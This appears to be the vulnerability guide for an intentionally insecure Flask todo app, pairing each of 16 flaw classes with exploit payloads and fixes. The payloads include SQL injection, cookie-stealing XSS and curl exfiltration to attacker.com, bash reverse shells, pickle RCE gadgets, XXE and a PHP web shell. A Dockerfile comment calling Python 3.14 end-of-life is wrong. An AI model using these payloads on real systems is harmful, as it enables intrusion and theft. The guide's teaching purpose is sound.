# VULNERABILITIES DOCUMENTATION

**DELIBERATELY VULNERABLE TODO APPLICATION - EDUCATIONAL REFERENCE**

This document provides detailed information about each intentional vulnerability in the application, including:

- CWE reference number

- Description of the vulnerability

- Location in code

- How to exploit

- Real-world impact

- How to fix/mitigate

---

## Table of Contents

1. [SQL Injection (CWE-89)](#1-sql-injection-cwe-89)
2. [Cross-Site Scripting (CWE-79)](#2-cross-site-scripting-cwe-79)
3. [Cross-Site Request Forgery (CWE-352)](#3-cross-site-request-forgery-cwe-352)
4. [Insecure Direct Object References (CWE-639)](#4-insecure-direct-object-references-cwe-639)
5. [Path Traversal (CWE-22)](#5-path-traversal-cwe-22)
6. [OS Command Injection (CWE-78)](#6-os-command-injection-cwe-78)
7. [XML External Entity (CWE-611)](#7-xml-external-entity-cwe-611)
8. [Server-Side Request Forgery (CWE-918)](#8-server-side-request-forgery-cwe-918)
9. [Insecure Deserialization (CWE-502)](#9-insecure-deserialization-cwe-502)
10. [Hardcoded Credentials (CWE-798)](#10-hardcoded-credentials-cwe-798)
11. [Weak Cryptography (CWE-327)](#11-weak-cryptography-cwe-327)
12. [Information Disclosure (CWE-200)](#12-information-disclosure-cwe-200)
13. [Missing Authentication (CWE-306)](#13-missing-authentication-cwe-306)
14. [Unrestricted File Upload (CWE-434)](#14-unrestricted-file-upload-cwe-434)
15. [Container Security Issues](#15-container-security-issues)
16. [Vulnerable Dependencies](#16-vulnerable-dependencies)

---

## 1. SQL Injection (CWE-89)

### Description
The application uses string concatenation to build SQL queries, allowing attackers to inject malicious SQL code.

### Locations

- `src/auth.py` - `authenticate_user()` function (line ~30)

- `src/database.py` - All CRUD operations

- `src/models.py` - `execute_query()` method

### Vulnerable Code Example

```python
# auth.py
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hash_password(password)}'"

```

### Exploitation
**Login Bypass:**

```

Username: admin' OR '1'='1
Password: anything

```

**Data Extraction:**

```

Search: ' UNION SELECT username,password,null,null,null,null,null,null FROM users--

```

**Database Enumeration:**

```

Search: ' UNION SELECT sqlite_version(),null,null,null,null,null,null,null--

```

### Impact

- Complete database compromise

- Authentication bypass

- Data theft

- Data manipulation

- Potential remote code execution

### Mitigation

```python
# Use parameterized queries
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password_hash)
)

# Or use an ORM like SQLAlchemy with proper parameter binding

```

---

## 2. Cross-Site Scripting (CWE-79)

### Description
User input is rendered without sanitization, allowing execution of malicious JavaScript.

### Locations

- `src/templates/todos.html` - Using `| safe` filter

- `src/templates/todo_detail.html` - Unsanitized title and description

- `src/templates/search.html` - Search results display

- `src/static/js/main.js` - innerHTML with unsanitized content

### Vulnerable Code Example

```html
<!-- todos.html -->
<h4>{{ todo.title | safe }}</h4>
<p>{{ todo.description | safe }}</p>

```

### Exploitation
**Stored XSS in Todo Title:**

```html
<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert('XSS')>

```

**Reflected XSS in Search:**

```

/search?q=<script>alert('XSS')</script>

```

**Session Hijacking:**

```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

```

### Impact

- Cookie theft and session hijacking

- Phishing attacks

- Malware distribution

- Account compromise

- Keylogging

### Mitigation

```python
# Remove | safe filter, use proper escaping
# Jinja2 auto-escapes by default
<h4>{{ todo.title }}</h4>

# Or explicitly escape
from markupsafe import escape
safe_title = escape(todo.title)

# Set Content Security Policy headers
Content-Security-Policy: default-src 'self'

```

---

## 3. Cross-Site Request Forgery (CWE-352)

### Description
No CSRF tokens on forms, allowing attackers to perform actions on behalf of authenticated users.

### Locations

- All forms in `src/templates/` - No CSRF tokens

- `src/config/config.py` - `CSRF_ENABLED = False`

- API endpoints - No CSRF validation

### Vulnerable Code Example

```html
<!-- No CSRF token -->
<form method="POST" action="/todo/1/delete">
    <button type="submit">Delete</button>
</form>

```

### Exploitation
**Malicious Website:**

```html
<!-- attacker.com -->
<form action="http://vulnerable-app.com/todo/1/delete" method="POST" id="csrf">
</form>
<script>
document.getElementById('csrf').submit();
</script>

```

**Delete All User's Todos:**

```javascript
for(let i=1; i<=100; i++) {
    fetch(`http://vulnerable-app.com/todo/${i}/delete`, {
        method: 'POST',
        credentials: 'include'
    });
}

```

### Impact

- Unauthorized actions performed as victim

- Data deletion

- Account modifications

- Privilege escalation

### Mitigation

```python
# Enable Flask-WTF CSRF protection
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# In templates
<form method="POST">
    {{ csrf_token() }}
    <!-- form fields -->
</form>

# For AJAX requests
<meta name="csrf-token" content="{{ csrf_token() }}">

```

---

## 4. Insecure Direct Object References (CWE-639)

### Description
No authorization checks when accessing resources, allowing users to access other users' data.

### Locations

- `src/database.py` - `get_todo_by_id()`, `update_todo()`, `delete_todo()`

- `src/__init__.py` - `/todo/<id>` route

### Vulnerable Code Example

```python
# database.py - No user ownership check
def get_todo_by_id(todo_id, user_id=None):
    # VULNERABILITY: user_id parameter is ignored!
    query = f"SELECT * FROM todos WHERE id = {todo_id}"
    return db.execute_query_one(query)

```

### Exploitation
**Access Other Users' Todos:**

```

# Your user ID: 2, Todo belongs to user 1
GET /todo/1
GET /todo/2
GET /todo/3
...

```

**Delete Other Users' Todos:**

```

POST /todo/5/delete

```

**Modify Other Users' Todos:**

```

POST /todo/7/update
title=Hacked&description=You've been pwned

```

### Impact

- Unauthorized data access

- Privacy violations

- Data manipulation

- Data deletion

### Mitigation

```python
def get_todo_by_id(todo_id, user_id):
    # Check ownership
    query = "SELECT * FROM todos WHERE id = ? AND user_id = ?"
    todo = db.execute_query_one(query, (todo_id, user_id))

    if not todo:
        raise Forbidden("Access denied")

    return todo

```

---

## 5. Path Traversal (CWE-22)

### Description
File paths are not validated, allowing access to arbitrary files on the server.

### Locations

- `src/utils.py` - `get_file_content()`, `save_uploaded_file()`

- `src/__init__.py` - `/file/<filename>` route

### Vulnerable Code Example

```python
# __init__.py
@app.route('/file/<path:filename>')
def download_file(filename):
    # VULNERABILITY: No path validation
    file_path = os.path.join(config.UPLOAD_FOLDER, filename)
    return send_file(file_path)

```

### Exploitation
**Read Sensitive Files:**

```

GET /file/../../etc/passwd
GET /file/../../app/src/config/config.py
GET /file/../../../home/user/.ssh/id_rsa

```

**Windows:**

```

GET /file/..\..\..\..\Windows\System32\config\SAM

```

### Impact

- Exposure of sensitive files

- Source code disclosure

- Configuration file access

- Private key theft

### Mitigation

```python
from werkzeug.utils import secure_filename
import os

def download_file(filename):
    # Sanitize filename
    safe_filename = secure_filename(filename)

    # Construct path
    file_path = os.path.join(config.UPLOAD_FOLDER, safe_filename)

    # Verify path is within upload directory
    real_path = os.path.realpath(file_path)
    if not real_path.startswith(os.path.realpath(config.UPLOAD_FOLDER)):
        abort(403)

    return send_file(real_path)

```

---

## 6. OS Command Injection (CWE-78)

### Description
User input is passed to system commands without sanitization, allowing arbitrary command execution.

### Locations

- `src/utils.py` - `run_system_command()`

- `src/__init__.py` - `/admin/execute` route

### Vulnerable Code Example

```python
# utils.py
def run_system_command(command):
    # VULNERABILITY: shell=True with user input
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    return result.decode('utf-8')

```

### Exploitation
**Command Chaining:**

```

Command: ls; cat /etc/passwd
Command: whoami && id && cat /etc/shadow

```

**Data Exfiltration:**

```

Command: curl http://attacker.com/?data=$(cat /app/src/config/config.py | base64)

```

**Reverse Shell:**

```

Command: bash -i >& /dev/tcp/attacker.com/4444 0>&1

```

### Impact

- Complete server compromise

- Remote code execution

- Data exfiltration

- Persistence mechanisms

- Lateral movement

### Mitigation

```python
# Never use shell=True with user input
# Use list form and validate inputs
import shlex

def run_safe_command(command):
    # Whitelist allowed commands
    allowed_commands = ['ls', 'pwd', 'date']

    parts = shlex.split(command)
    if parts[0] not in allowed_commands:
        raise ValueError("Command not allowed")

    # Use list form, no shell
    result = subprocess.check_output(parts, shell=False)
    return result.decode('utf-8')

```

---

## 7. XML External Entity (CWE-611)

### Description
XML parser allows external entity references, enabling file disclosure and SSRF.

### Locations

- `src/utils.py` - `parse_xml()`, `parse_xml_file()`

- `src/__init__.py` - `/import-xml` route

### Vulnerable Code Example

```python
# utils.py
def parse_xml(xml_string):
    # VULNERABILITY: Default parser allows external entities
    parser = XMLParser()
    root = ET.fromstring(xml_string, parser=parser)
    return root

```

### Exploitation
**File Disclosure:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<todo>
  <title>&xxe;</title>
</todo>

```

**SSRF via XXE:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<todo>
  <description>&xxe;</description>
</todo>

```

**Billion Laughs Attack (DoS):**

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>

```

### Impact

- File disclosure

- SSRF attacks

- Denial of service

- Port scanning internal networks

### Mitigation

```python
from defusedxml import ElementTree as DefusedET

def parse_xml_safely(xml_string):
    # Use defusedxml library
    root = DefusedET.fromstring(xml_string)
    return root

# Or disable external entities manually
import xml.etree.ElementTree as ET
ET.XMLParser(resolve_entities=False)

```

---

## 8. Server-Side Request Forgery (CWE-918)

### Description
Application fetches URLs provided by users without validation, allowing internal network scanning.

### Locations

- `src/utils.py` - `fetch_url()`

- `src/__init__.py` - `/fetch-url` route

### Vulnerable Code Example

```python
# utils.py
def fetch_url(url):
    # VULNERABILITY: No URL validation, SSL verification disabled
    response = requests.get(url, verify=False, timeout=5)
    return response.text

```

### Exploitation
**Internal Network Scanning:**

```

POST /fetch-url
url=http://192.168.1.1:22
url=http://192.168.1.1:80
url=http://192.168.1.1:3306

```

**Access Internal Services:**

```

POST /fetch-url
url=http://localhost:8080/admin
url=http://internal-api.local/users
url=http://metadata.google.internal/computeMetadata/v1/

```

**Read Local Files:**

```

POST /fetch-url
url=file:///etc/passwd

```

### Impact

- Internal network reconnaissance

- Access to internal services

- Cloud metadata exposure (AWS, GCP, Azure)

- Port scanning

- Bypass firewall restrictions

### Mitigation

```python
from urllib.parse import urlparse
import ipaddress

def fetch_url_safely(url):
    # Parse URL
    parsed = urlparse(url)

    # Only allow HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")

    # Resolve hostname to IP
    import socket
    ip = socket.gethostbyname(parsed.hostname)

    # Block private IP ranges
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback:
        raise ValueError("Private IP not allowed")

    # Fetch with SSL verification enabled
    response = requests.get(url, verify=True, timeout=5)
    return response.text

```

---

## 9. Insecure Deserialization (CWE-502)

### Description
Using pickle to deserialize untrusted data allows arbitrary code execution.

### Locations

- `src/utils.py` - `serialize_session()`, `deserialize_session()`

- `src/auth.py` - Session handling

### Vulnerable Code Example

```python
# utils.py
def deserialize_session(serialized_data):
    # VULNERABILITY: Unpickling untrusted data
    return pickle.loads(serialized_data)

```

### Exploitation
**Remote Code Execution:**

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/pwned',))

malicious_data = pickle.dumps(RCE())
# Send this as session data

```

**Reverse Shell:**

```python
class ReverseShell:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

```

### Impact

- Remote code execution

- Complete server compromise

- Privilege escalation

- Data exfiltration

### Mitigation

```python
# Use JSON instead of pickle
import json

def serialize_session(session_data):
    return json.dumps(session_data)

def deserialize_session(serialized_data):
    return json.loads(serialized_data)

# Or use signed sessions
from itsdangerous import URLSafeSerializer
serializer = URLSafeSerializer(SECRET_KEY)
token = serializer.dumps(session_data)

```

---

## 10. Hardcoded Credentials (CWE-798)

### Description
Credentials, API keys, and secrets are hardcoded in source code and configuration files.

### Locations

- `src/config/config.py` - Multiple hardcoded secrets

- `Dockerfile` - Environment variables with secrets

- `compose.yml` - Hardcoded credentials

### Vulnerable Code Example

```python
# config.py
DATABASE_PASSWORD = "password123"
SECRET_KEY = "super-secret-key-123"
API_KEY = "12345"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"

```

### Exploitation

- Secrets discoverable in source code repositories

- Exposed in version control history

- Visible in container images

- Accessible via file disclosure vulnerabilities

### Impact

- Unauthorized access to systems

- API abuse

- Data breaches

- Identity theft

- Financial loss

### Mitigation

```python
# Use environment variables
import os
DATABASE_PASSWORD = os.getenv('DATABASE_PASSWORD')
SECRET_KEY = os.getenv('SECRET_KEY')

# Use secret management services
from azure.keyvault.secrets import SecretClient
secret = client.get_secret("database-password")

# Never commit secrets to version control
# Use .env files (not committed)
from dotenv import load_dotenv
load_dotenv()

```

---

## 11. Weak Cryptography (CWE-327)

### Description
Using MD5 for password hashing, which is cryptographically broken.

### Locations

- `src/utils.py` - `hash_password()` function

- `src/models.py` - Password storage

### Vulnerable Code Example

```python
# utils.py
def hash_password(password):
    # VULNERABILITY: MD5 is broken
    return hashlib.md5(password.encode()).hexdigest()

```

### Exploitation
**Rainbow Table Attacks:**

```

MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99
MD5("admin") = 21232f297a57a5a743894a0e4a801fc3

```

**Online Hash Crackers:**

- <https://crackstation.net/>
- <https://hashcat.net/hashcat/>

**Dictionary/Brute Force:**

```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt

```

### Impact

- Easy password cracking

- Account compromise

- Mass credential theft

- Identity theft

### Mitigation

```python
# Use bcrypt
import bcrypt

def hash_password(password):
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password, password_hash):
    return bcrypt.checkpw(password.encode(), password_hash)

# Or argon2
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
ph.verify(hash, password)

```

---

## 12. Information Disclosure (CWE-200)

### Description
Detailed error messages and debug information exposed to users.

### Locations

- `src/config/config.py` - `DEBUG = True`

- `src/__init__.py` - Error handlers expose details

- `src/auth.py` - Detailed authentication errors

### Vulnerable Code Example

```python
# __init__.py
@app.errorhandler(500)
def server_error(e):
    # VULNERABILITY: Exposing internal errors
    return f"500 Internal Server Error: {str(e)}", 500

```

### Exploitation

- Database structure revealed in SQL errors

- File paths exposed in stack traces

- Framework versions disclosed

- Internal IP addresses revealed

### Impact

- Information for targeted attacks

- Technology stack enumeration

- Security control identification

- Easier exploitation of other vulnerabilities

### Mitigation

```python
# Disable debug mode
DEBUG = False

# Generic error messages
@app.errorhandler(500)
def server_error(e):
    # Log the error internally
    app.logger.error(f"Server error: {str(e)}")
    # Return generic message to user
    return "An error occurred. Please try again later.", 500

# Remove detailed error pages
app.config['PROPAGATE_EXCEPTIONS'] = False

```

---

## 13. Missing Authentication (CWE-306)

### Description
API endpoints and critical functions lack authentication checks.

### Locations

- `src/__init__.py` - `/api/*` routes have no authentication

- `src/auth.py` - `check_authentication()` can be bypassed

### Vulnerable Code Example

```python
# __init__.py
@app.route('/api/todos', methods=['GET'])
def api_get_todos():
    # VULNERABILITY: No authentication required
    user_id = request.args.get('user_id', 1)
    result = database.get_user_todos(user_id)
    return jsonify(result)

```

### Exploitation
**Access Any User's Data:**

```

GET /api/todos?user_id=1
GET /api/todos?user_id=2
GET /api/todo/1

```

**Bypass Authentication:**

```

GET /todos?bypass=true

```

### Impact

- Unauthorized data access

- API abuse

- Data manipulation

- Service disruption

### Mitigation

```python
from functools import wraps

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth = check_authentication()
        if not auth['authenticated']:
            return jsonify({"error": "Authentication required"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/todos')
@require_auth
def api_get_todos():
    # Now requires authentication
    pass

```

---

## 14. Unrestricted File Upload (CWE-434)

### Description
No validation of uploaded file types, names, or content.

### Locations

- `src/utils.py` - `save_uploaded_file()`

- `src/__init__.py` - `/todo/<id>/upload` route

### Vulnerable Code Example

```python
# utils.py
def save_uploaded_file(file, filename):
    # VULNERABILITY: No validation
    file_path = os.path.join(config.UPLOAD_FOLDER, filename)
    file.save(file_path)
    return file_path

```

### Exploitation
**Upload Web Shell:**

```python
# shell.php
<?php system($_GET['cmd']); ?>

```

**Upload Malicious Scripts:**

```

shell.py, reverse_shell.sh, malware.exe

```

**Filename Attacks:**

```

../../shell.php
../../../tmp/shell.py

```

### Impact

- Remote code execution

- Server compromise

- Malware distribution

- Data theft

- Denial of service

### Mitigation

```python
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def save_file_safely(file):
    if not allowed_file(file.filename):
        raise ValueError("File type not allowed")

    # Sanitize filename
    filename = secure_filename(file.filename)

    # Generate unique name
    import uuid
    unique_filename = f"{uuid.uuid4()}_{filename}"

    file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
    file.save(file_path)

    # Scan for malware (if possible)
    # scan_file(file_path)

    return file_path

```

---

## 15. Container Security Issues

### Docker Vulnerabilities

#### Using EOL Base Image

```dockerfile
FROM python:3.6-slim  # Python 3.14 is end-of-life

```

**Impact:** Unpatched CVEs, no security updates

#### Running as Root

```dockerfile
# No USER directive - runs as root

```

**Impact:** Container escape = root on host

#### Hardcoded Secrets

```dockerfile
ENV DATABASE_PASSWORD="insecure_password123"
ENV SECRET_KEY="my-super-secret-key-12345"

```

**Impact:** Secrets visible in image layers

#### Privileged Mode

```yaml
privileged: true  # compose.yml

```

**Impact:** Full host access

#### Mounting Docker Socket

```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock

```

**Impact:** Container can control Docker host

### Mitigation

```dockerfile
# Use current, maintained base image
FROM python:3.11-slim

# Run as non-root user
RUN useradd -m -u 1000 appuser
USER appuser

# Use build secrets, not ENV
RUN --mount=type=secret,id=db_pass \
    export DB_PASS=$(cat /run/secrets/db_pass)

# Multi-stage build
FROM builder AS final
COPY --from=builder --chown=appuser:appuser /app /app

# Security options in compose.yml
security_opt:
  - no-new-privileges:true
read_only: true
cap_drop:
  - ALL

```

---

## 16. Vulnerable Dependencies

### Outdated Packages with Known CVEs

 | Package | Version Used | CVEs | Severity |
 | --------- | ------------- | ------ | ---------- |
 | Flask | 0.12.2 | CVE-2018-1000656, CVE-2019-1010083 | High |
 | Werkzeug | 0.14.1 | CVE-2019-14806 | Critical |
 | Jinja2 | 2.10 | CVE-2019-10906, CVE-2019-8341 | High |
 | PyYAML | 3.12 | CVE-2017-18342, CVE-2019-20477 | Critical |
 | requests | 2.6.0 | CVE-2018-18074 | High |
 | Pillow | 5.0.0 | CVE-2019-16865, CVE-2020-5312 | Critical |
 | cryptography | 2.0 | CVE-2018-10903 | High |

### Exploitation

- Known exploits available publicly

- Metasploit modules exist for some

- Automated scanners detect these

### Mitigation

```bash
# Update dependencies regularly
pip install --upgrade flask werkzeug jinja2 pyyaml requests pillow

# Use dependency scanning
pip-audit
safety check
snyk test

# Pin versions with hashes
pip install flask==2.3.0 --hash=sha256:...

# Automated updates
dependabot, renovate

```

---

## Summary

This application demonstrates **50+ individual security issues** across multiple categories:

- **10 OWASP Top 10 categories** represented

- **14 distinct CWE classes** demonstrated

- **6 container security issues**

- **7+ vulnerable dependencies** with known CVEs

**Remember:** These vulnerabilities are intentional for educational purposes.
In real applications, follow security best practices and keep dependencies updated!

---

## Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

- [CWE Top 25](https://cwe.mitre.org/top25/)

- [Python Security](https://python.readthedocs.io/en/stable/library/security.html)

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)

- [Flask Security Considerations](https://flask.palletsprojects.com/en/2.3.x/security/)

## Testing Tools

- **Burp Suite** - Web vulnerability scanner

- **OWASP ZAP** - Security testing proxy

- **SQLMap** - SQL injection tool

- **Metasploit** - Penetration testing framework

- **Nmap** - Network scanning

- **Nikto** - Web server scanner

**Use these tools only on systems you own or have permission to test!**
